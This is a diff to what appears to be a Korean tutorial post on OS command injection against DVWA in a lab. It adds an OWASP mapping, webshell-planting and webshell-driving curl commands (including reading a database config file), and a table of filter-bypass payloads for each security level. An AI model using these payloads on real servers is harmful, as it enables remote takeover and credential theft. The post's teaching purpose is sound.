@@ -25,6 +25,21 @@ mermaid: true
 
 ---
 
+## OWASP Top 10 매핑
+
+| 항목 | 내용 |
+|---|---|
+| OWASP 카테고리 | **A03:2021 – Injection** |
+| CWE | CWE-78 (OS 명령에 사용되는 특수 요소의 부적절한 처리) |
+| 영향 | 서버에서 임의 OS 명령 실행 → Reverse Shell·웹쉘로 **완전한 서버 장악(RCE)** |
+| 한 줄 핵심 | 사용자 입력이 **OS 셸 명령의 일부**로 해석되어, 셸 메타문자(`;`,`|`,`&&`)로 명령이 덧붙음 |
+
+> SQLi(01)·XSS(02)와 함께 **A03 Injection** 군이다. 단, 결과가 **OS 명령 실행(RCE)** 이라 영향도가 가장 크다.  
+> 방어 원리는 동일 — **사용자 입력을 명령 문자열에 합치지 말 것**(배열 인자 + 화이트리스트).
+{: .prompt-info }
+
+---
+
 ## 1. 이론: Command Injection이란
 
 ### 1.1 개념
@@ -316,7 +331,7 @@ Reverse Shell 없이도 웹쉘을 파일로 서버에 저장하면 영구적인 
 **DVWA Command Injection에 입력**:
 
 ```
-127.0.0.1; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
+127.0.0.1; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/DVWA/hackable/uploads/shell.php
 ```
 
 ### 4.2 Webshell 활용
@@ -325,23 +340,26 @@ Kali에서 curl로 웹쉘을 통해 명령 실행:
 
 ```bash
 # 현재 계정 확인
-curl "http://192.168.0.30/shell.php?cmd=id"
+curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=id"
 
 # 시스템 정보 확인
-curl "http://192.168.0.30/shell.php?cmd=uname+-a"
+curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=uname+-a"
 
-# 민감 파일 열람
-curl "http://192.168.0.30/shell.php?cmd=cat+/etc/shadow"
+# 민감 파일 열람 — www-data 권한으로 읽을 수 있는 DB 설정 파일(계정·비밀번호 노출)
+curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=cat+/var/www/html/DVWA/config/config.inc.php"
 
 # 디렉터리 목록 확인
-curl "http://192.168.0.30/shell.php?cmd=ls+-la+/var/www/html"
+curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=ls+-la+/var/www/html"
 ```
+
+> 웹쉘은 웹 서버 계정인 **`www-data` 권한**으로 동작한다. 그래서 `/etc/passwd`나 DB 설정 파일(`config.inc.php`)은 읽히지만, `/etc/shadow`처럼 **root 전용 파일은 "Permission denied"** 가 난다. 이 파일들을 읽으려면 별도의 **권한 상승(Privilege Escalation)** 이 필요하다.
+{: .prompt-tip }
 
 ### 4.3 Webshell 탐지 및 정리
 
 ```bash
 # 실습 후 웹쉘 삭제
-curl "http://192.168.0.30/shell.php?cmd=rm+/var/www/html/shell.php"
+curl "http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=rm+/var/www/html/DVWA/hackable/uploads/shell.php"
 # 또는 SSH로 직접 삭제
 ```
 
@@ -432,14 +450,33 @@ $target = str_replace(array_keys($substitutions), $substitutions, $target);
 > 화이트리스트 방식(IP 형식만 허용)으로 검증해야 한다.
 {: .prompt-warning }
 
-### 6.3 레벨별 필터 비교
+### 6.3 레벨별 공격·방어 한눈에
 
-| 레벨 | 필터링 내용 | 우회 가능 여부 |
-|---|---|---|
-| **Low** | 없음 | 항상 가능 |
-| **Medium** | `&&`, `;` 제거 | `\|`, `\|\|`, `%0a` 로 우회 |
-| **High** | 거의 모든 특수문자 블랙리스트 | 매우 어려움 (일부 우회 존재) |
-| **Impossible** | 화이트리스트 (IP 형식만 허용) | 불가 |
+| 레벨 | 서버 측 방어 | 공격(우회) 원리 | 방어 한계 |
+|---|---|---|---|
+| **Low** | 없음 | 구분자(`;`, `&&`)로 명령 이어붙이기 | 검증 자체가 없음 |
+| **Medium** | `&&`, `;` 문자열 제거 (블랙리스트) | 막지 않은 **파이프·개행(`%0a`)** 구분자로 우회 | 빠뜨린 구분자로 우회 |
+| **High** | 다수 특수문자 블랙리스트 (단, 필터 버그 존재) | "파이프+공백"은 막지만 **공백 없는 파이프**는 누락 | 블랙리스트의 미세한 누락 |
+| **Impossible** | IP를 4옥텟으로 분리해 **각 옥텟 `is_numeric()` 화이트리스트** 검증 | 셸 메타문자가 숫자 검증을 통과 못 해 불가 | — (근본 방어) |
+
+레벨별 대표 페이로드 (DVWA `ping` IP 입력칸에 입력):
+
+```bash
+# Low — 세미콜론/AND 로 명령 분리
+127.0.0.1; cat /etc/passwd
+127.0.0.1 && id
+
+# Medium — &&,; 가 제거되므로 파이프/개행으로 우회
+127.0.0.1 | cat /etc/passwd
+127.0.0.1 || id
+
+# High — '| '(파이프+공백)은 막지만 '|'(공백 없는 파이프)는 누락
+127.0.0.1|cat /etc/passwd
+```
+
+> 핵심: 블랙리스트(Medium/High)는 항상 빠뜨린 문자가 있다. 특히 **High의 "파이프+공백 vs 공백 없는 파이프" 버그**가 대표적 교훈이다.  
+> Impossible의 **입력 형식 화이트리스트 + OS 명령 미사용**(7장)만이 RCE를 차단한다.
+{: .prompt-tip }
 
 ---
 
